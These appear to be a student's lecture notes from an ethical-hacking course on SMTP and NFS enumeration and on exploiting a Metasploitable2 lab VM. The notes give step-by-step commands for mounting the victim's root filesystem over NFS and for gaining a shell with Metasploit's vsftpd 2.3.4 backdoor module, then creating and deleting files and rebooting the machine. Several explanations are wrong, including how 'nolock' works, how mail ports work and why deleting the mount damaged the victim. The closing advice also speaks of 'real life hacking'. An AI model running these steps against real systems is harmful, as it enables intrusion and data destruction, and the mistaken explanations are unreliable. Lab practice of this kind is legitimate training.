#WsCubeTech-CEH-notes 

---
### What we'll learn 
> Lecture Name : SMTP & NFS enumeration | Exploitation
> 1) Practical work : SMTP enumeration scan
> 2) Practical work : NFS enumeration scan
> 3) Further STEPS of Lecture 16 - exploits , auxiliary , payloads for each service/protocol

---
### Practical work : SMTP enumeration scan
- port no. of SMTP service/protocol i.e 25
- STEP 1 :  `nc 192.168.192.130 25` & hit enter , output : connection refused - cuz IP address is wrong <br>STEP 1.1 : `nc 192.168.224.128 25` & enter , output : <br>![[17_lecture-0-M3.jpg | 500]] <br>- so connection established
- STEP 2 : help , ls commands not gonna work in SMTP service/protocol - cuz SMTP used for mail transferring ✔
	- STEP 2.1 : run `vrfy admin@gmail.com` , output : <br>![[17_lecture-1-M3.jpg | 500]]
	- STEP 2.2 : run `VRFY admin@admin.com` OR `ETRN localhost` , output : still not work
	- STEP 2.3 : run `VRFY root` , output : "252 2.0.0 root" <br>- but we'll not get any files & folder access if we run `ls , help` commands <br>- cuz purpose of SMTP i.e just to verify mail & see the mail stuff only ✔
- before doing NFS enumeration , first check in "Saurabh.html" report , whether NFS service/protocol exist or not ✔

### Practical work : NFS enumeration scan
- in "Saurabh.html" report , `111` is a port no. of NFS aka rpcbind ✔ <br>![[17_lecture-2-M3.jpg | 500]]
- NFS = Network File System
- now let's scan port no. 111 - means we need to scan all scripts of NFS service/protocol
- STEP 1 : `sudo su`
- STEP 2 : `nmap -sS -v -p111 192.168.224.128 --script=nfs* -sV -O -oX bhmanual.xml` <br>but we know the OS - so remove `-O`
	- STEP 2.1 : run `nmap -sS -v -p111 192.168.224.128 --script=nfs* -sV -oX bhmanual.xml` & enter
- STEP 3 : `xsltproc bhmanual.xml -o bhmanual.html` , 
	- output : open the .html file in browser <br>![[17_lecture-3-M3.jpg | 500]]
	- here in "nfs-ls" section , we're getting files which we can access
	- in "rpcinfo" section , "mountd" - means we can bring files of that Victim's system in our system ✔
- STEP 4 : in our main system i.e Kali , let's try to do mount
	- `Note ✅` : mount could be risky cuz whole Victim's machine can be mounted/copied ✔
	- STEP 4.1 : in our system , in desktop - make a folder as "Mount"
	- run `mount -o nfs 192.168.224.128:/ /home/kali/Desktop/Mount/` & enter
		- this command means via "nfs" service mount this Victim's system i.e "192.168.224.128" ✔<br>- & whatever stuff gets mounted - put those things inside "Mount" folder (which is created in our system) ✔<br>- & after defining Victim's System IP address - then give a colon & a blackslash `:/` <br>- "192.168.224.128:/ /home/kali/Desktop/Mount/" : here b/w both - have a space <br>which means both are different location ✔
		- output : <br>![[17_lecture-4-M3.jpg | 500]]
		- in output , telling incorrect path for mount
	- STEP 4.2 : `mount -o nolock 192.168.224.128:/ /home/kali/Desktop/Mount/` <br>- "nolock" : means whatever things are locked - those things will be bypass by "nolock" ✔
	- STEP 4.3 : `cd desktop` & then `ls`
	- STEP 4.4 : `cd Mount` & then `ls`
		- `Note ✅` : in Linux OS , folder & files are case-sensitive <br>- that's why we wrote "M" in capital inside the command <br>- but in windows os , folder & files are not case-sensitive 
		- output : we'll get all the files & folder of Victim's system - including "root" & "bin" folders <br>- so `mount` command - kindof made a copy of files & folders (of Victim's system) in our system <br>![[17_lecture-5-M3.jpg | 500]]
		- STEP 4.4.1 : in Metasploitable2 system , checking whether the files & folders <br>which we got are of Victim's system or not <br>> STEP 1 : to go in root folder , run `cd /` - it's a shortcut command to reach at root folder & then `ls` ✔ <br>![[17_lecture-6-M3.jpg | 500]]
- There's one more Enumeration of NFS - which connect the Victim's machine completely <br>& to disconnect it , we need to do too much hustle - like might need to restart the own system/PC
- Ques : what does http service/protocol do ? <br>Ans : it just transferring & receiving ur data from the server & it's port no. 80 ✔ <br>Ques : what does Domain do ? <br>Ans : it just used to check DNS & DNS records ✔ <br>- just do that homework of making PPT on all Application Layer Protocols

### Further STEPS of Lecture 16 - exploits , auxiliary , payloads for each service
- STEP 1 : `sudo su` => to go in superuser mode
- STEP 2 : `service postgresql start` => starting the database of "msfconsole" tool
- STEP 3 : `msfconsole` => starting the tool
- STEP 4 : `db_status` => checking whether the database of "msfconsole" tool or not i.e postgresql
- STEP 5 : `db_import Saurabh.xml` => adding the report of a particular system i.e 192.168.224.128
- STEP 6 : `hosts` => checking how many reports/IP-addresses - we added in "msfconsole" tool
- STEP 7 : `services` => checking services of a specific report/IP-address <br>- & wrote the "services" only without IP-address cuz we have only one report/IP-address added inside the tool
- STEP 8 : `search vsftpd` => searching service via software , output : <br>![[17_lecture-7-M3.jpg | 500]]
- Ques : in this output pic , which one is better - auxiliary or exploit ? ✔
	- Ans : in lecture 6 , we understand
	- Auxiliaries are just scripts which used to bring advance information about Victim's System <br>- so those scripts which we used in Lecture 15 - are of `nmap` tool <br>- & vsftpd_232 , vsftpd_234_backdoor , etc : are scripts of `msfconsole` tool <br>so Auxiliaries are just scripts ✔
	- Exploits used to hack the Victim's system for short-term <br>- so to hack the system - we need "exploit"
- STEP 9 : now let's use this exploit script
	- two ways to use the exploit script i.e "exploit/unix/ftp/vsftpd_234_backdoor" ✔<br>1st way : run command `use exploit/unix/ftp/vsftpd_234_backdoor` <br>2nd way : we got no. of this exploit script i.e 1 - in "#" column : so run command `use 1`
	- here 234 of "vsftpd_234_backdoor" exploit script : means that's the version
	- STEP 9.1 : run command `use 1` , output : <br>![[17_lecture-8-M3.jpg | 500]]
	- so this exploit script is set for hacking , now we need to do setting in exploit before hacking <br>- means which settings need to give & what things "exploit" required to run , <br>get the information from Victim's System & hack the system ✔<br>- for this we have a command ⬎
	- STEP 9.2 : run either `options` OR `show options` , output : <br>![[17_lecture-9-M3.jpg | 500]]
	- this output : means whatever things required for "exploit" - is defined as Yes or no in "Required" column <br>- so "Exploit" doesn't want CHOST , CPORT , Proxies <br>- & it needs RHOSTS , RPORT
	- before using RHOSTS , RPORT - we need to understand a concept 
- `imp note ⭐` : mostly these 4 terms will come & always use these 4 terms i.e LHOSTS , LPORT , RHOSTS , RPORT ✔
	- LHOSTS : means listening , on which device we want to listen ✔
	- Eg : we have 2 system , System "A" & "B" System (Victim's system) <br>- u want to attack or send exploits on "B" System via ur System "A" <br>- so when u send the exploit on "B" System - then that exploit will do it's task or run on "B" System <br>- then that exploit will send the connection/reply to ur system i.e "A" - once that exploit run on "B" System <br>- so that exploit requires IP address & a port of ur system in order to send that reply to ur system from "B" System <br>- so that exploit send the reply to that IP address & a port , that IP address = aka LHOST & that port = aka LPORT ✔
	- so whenever we exploit then we already told that exploit - that whenever u (means exploit) go that system <br>- then send the connection <br>- Ques : but How that exploit gonna know on which IP address & a port - that exploit needs to send data/information ✔<br>Ans : so to data/reply/connection by that exploit , we already define a IP address & a port inside that exploit <br>before sending that exploit to Victim's system<br>- so 
	- so System "A" is ur system , so us system is LHOST & LPORT
	- IP address = host/address & port = road/route-way <br>LHOST = listening/local HOST (HOST means - address/IP-address) <br>LPORT = listening/local PORT (means on which route/road u're standing to listen the reply of that exploit) ✔
	- in LHOST , attacker's IP address will come i.e our system's IP address <br>in LPORT , attacker's port will come i.e a port of our system's <br>- currently , here u're a attacker i.e System "A" ✔
	- in RHOST , remote's IP address will come i.e IP address of Victim's system (on which u're attacking) <br>in RPORT , remote's port will come i.e a port of of Victim's system ✔ <br>- currently , here System "B" is Victim
	- Advice : when we do practical we'll understand , no need to worry
	- `Imp note ⭐` : concept working of port ✔
		- Eg 1 : let's say u're sending a connection via port no. 21 to Victim's system<br>so the connection will go via port no. 21 from ur system <br>- but that exploit can be on any port no. of Victim's system , but any one port no. must be open <br>- Eg : that port could be 22 or 23 
		- Eg 2 : let's say , u're sending a mail to Victim's system & mail port no. is 25 <br>- so that mail will go via 25 port no. from ur system <br>- but Victim's System can receive that mail in any port no. (which is empty & near to that 25 port no.) 
	- rough sketch <br>![[17_lecture-10-M3.jpg | 500]]
- STEP 10 : setting RHOSTS & RPORT
	- Ques : which system that u need to give RHOSTS & RPORT <br>Ans : of Victim's system i.e Metasploitable2 
	- STEP 10.1 : run `set rhosts 192.168.224.128` : used to set/add the Victim's IP address
	- STEP 10.2 : vsftpd software - which is running on FTP protocol <br>- so we're finding exploit for FTP & FTP runs on port no. 21<br>![[17_lecture-11-M3.jpg | 500]] <br>- & even by-default in this pic , port no. 21 of FTP is set as RPORT - which means we got the confirmation <br>- that this exploit gonna work properly cuz configuration of port no. of FTP is by-default set ✔ <br>- but if we want to change the port no. to something else then , run `set rport 44` <br>- now to check whether the IP address & port no. changed or not , run `options` , output : <br>![[17_lecture-12-M3.jpg | 500]]
	- STEP 10.3 : setting the port no. of FTP , so run the same command `set rport 21` , <br>- then run `options` - to check whether the port no. is changed or not , output <br>![[17_lecture-13-M3.jpg | 500]]
- STEP 11 : now we'll exploit the Victim's system via his/her RHOSTS & RPORT
	- 2 ways to exploit <br>1st way : `exploit` <br>2nd way : `run -j` => use this command when `exploit` command not working <br>3rd way : `run` <br>> `-j` : means processing will be done in background or behind the scene
	- STEP 11.1 : run `exploit` , output :<br>![[17_lecture-14-M3.jpg | 500]]
	- this output shows that we got the shell of Victim's machine
	- STEP 11.2 : run `ls` , output : we'll get all the files & folders - including "root" folder <br>- & same files & folders shown - just like earlier we did via `mount` command 
	- STEP 11.3 : run `ifconfig` , output : we'll get the details <br>> STEP 11.3.1 : run `mkdir test` command & then `ls` , output : "test" folder also created<br>> STEP 11.3.2 : open the Metasploitable2 (Victim's system) , then run `ls` , output : "test" will be shown <br>> STEP 11.3.3 : in kali , run `rm -r test` , output : "test" folder is removed permanently <br>> STEP 11.3.4 : in Metasploitable2 , run `ls` , output : "test" is also removed from this machine
	- STEP 11.4 : now let's reboot the Victim's system via our system , run `reboot` <br>- output : when u go in Metasploitable2 system , rebooting process started & all the services will rebooted ✔ <br>![[17_lecture-15-M3.jpg | 500]]
	- so session also closed due to reboot
	- STEP 11.5 : to make connection again , run `exploit` command
	- `note ✅` : if u start the exploit & then suddenly session closed 
		- if this issue comes , then run `sessions -i <session-number>`
		- Eg : here session 1 is closed , so session no. is 1 ✔
		- so run `sessions -i 1` : means connect that session no. for interaction which is exited/closed ✔
		- so after running `exploit` command , a new session no. is created <br>![[17_lecture-16-M3.jpg | 500]] <br>- so now session no. 2 is closed , so to reconnect with this session no. , run `sessions -i 2`

---
### Homework
1. do this above practical for each service/protocol - which are inside "Saurabh.xml" report of "Automation" Enumeration

---
### End of the lecture (Doubts) :
1. Ques : can be hack the Windows OS with the same process 
	- Advice : don't go directly into Windows OS & apply all these commands step by STEP 
		- cuz u can't hack the windows OS easily , u'll face lot of issues , <br>even getting into windows OS - firewall & defender will stop u <br>& u have to do much more Information Gathering & Scanning
		- so practice here in that Vulnerable System
		- but to hack the system , process will be same 
2. Ques : should we need to master all the tools or a particular tool of kali linux
	- Ans : we have to be all-rounder cuz based on situations every tools has it's own importance 
	- Eg : let's say u got to know that vulnerable system has a vulnerability of FTP <br>so instead of using metasploit tool , we can use netcat tool <br>- cuz we can do fast stuff in netcat tool 
	- so u have to use each tools based on situations ✔
3. Ques : Mine Doubt : in "Practical work - NFS enumeration scan" ✔
	- i run this command : `mount -o nfs 192.168.59.130:/ /home/kali/Desktop/Mount/`
	- then files & folder also mounted
	- Doubt : but when i deleted the folder i.e Mount , then "Mount" folder got deleted <br>but files & folders of Victim's system i.e Metasploitable2 also got deleted - & Victim's system not working properly <br>1) why this happen - Reason ? <br>2) is mounted means copied or Moved ?
	- Ans : cuz u keep that victim's system online that's why , solution <br>1) either close the Victim's system <br>2) OR what if u don't have control to close the Victim's system in real life hacking - then <br>close ur Kali system's network - then run that command , no issue will happen <br>- Q : are all commands can be run without network of kali OS or not ? <br> Ans : one more thing , some commands run without network & some can't run without network 
